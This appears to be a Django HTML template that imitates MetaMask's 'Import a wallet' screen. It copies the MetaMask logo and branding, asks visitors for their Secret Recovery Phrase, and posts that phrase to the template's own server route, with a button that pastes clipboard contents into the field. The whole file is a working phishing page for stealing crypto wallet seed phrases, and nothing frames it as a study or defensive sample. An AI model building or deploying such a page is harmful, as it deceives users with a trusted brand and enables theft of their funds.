{% load static %}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Import a wallet - MetaMask</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            background: #000000;
            color: #ffffff;
            font-family: 'Inter', system-ui, sans-serif;
            margin: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .container {
            width: 100%;
            max-width: 460px;
            padding: 32px 24px;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 32px;
        }
        .logo { width: 48px; height: auto; }
        .lang {
            background: transparent;
            border: none;
            color: #ffffff;
            font-size: 14px;
            cursor: pointer;
        }
        .back {
            font-size: 32px;
            cursor: pointer;
            color: #ffffff;
            margin-bottom: 16px;
            display: block;
        }
        h1 {
            font-size: 28px;
            font-weight: 600;
            margin: 0 0 8px 0;
        }
        .subtitle {
            color: #8a8a8a;
            font-size: 14px;
            margin-bottom: 24px;
        }
        textarea {
            width: 100%;
            min-height: 160px;
            background: #1c1c1e;
            border: 1px solid #333;
            color: #ffffff;
            padding: 16px;
            border-radius: 12px;
            font-size: 16px;
            resize: vertical;
            margin-bottom: 12px;
        }
        textarea:focus {
            outline: none;
            border-color: #037dd6;
            box-shadow: 0 0 0 3px rgba(3, 125, 214, 0.3);
        }
        .paste {
            color: #037dd6;
            background: none;
            border: none;
            font-size: 14px;
            cursor: pointer;
            float: right;
            margin-bottom: 16px;
        }
        .helper {
            color: #8a8a8a;
            font-size: 13px;
            margin-bottom: 32px;
            clear: both;
        }
        .btn {
            width: 100%;
            padding: 16px;
            background: #037dd6;
            color: white;
            border: none;
            border-radius: 999px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        .btn:hover {
            background: #0260b0;
        }
        .error {
            background: #661800;
            color: #ffcccc;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 24px;
            text-align: center;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <img src="{% static 'images/MetaMask_Fox.svg' %}" alt="MetaMask" class="logo">
            <select class="lang">
                <option>English</option>
            </select>
        </div>

        <span class="back">&larr;</span>

        <h1>Import a wallet</h1>
        <p class="subtitle">Enter your Secret Recovery Phrase <span class="info-icon">ⓘ</span></p>

        {% if error %}
            <div class="error">{{ error }}</div>
        {% endif %}

        <form method="post" action="{% url 'import_success' %}">
            {% csrf_token %}
            <textarea name="seed_phrase" placeholder="Separate words with spaces..." required></textarea>
            <button type="button" class="paste">Paste</button>
            <p class="helper">Add a space between each word and make sure no one is watching.</p>
            <button type="submit" class="btn">Continue</button>
        </form>
    </div>

    <script>
        document.querySelector('.paste').addEventListener('click', async () => {
            try {
                const text = await navigator.clipboard.readText();
                document.querySelector('textarea').value = text.trim();
            } catch (err) {
                alert('Paste failed: ' + err);
            }
        });
    </script>

</body>
</html>
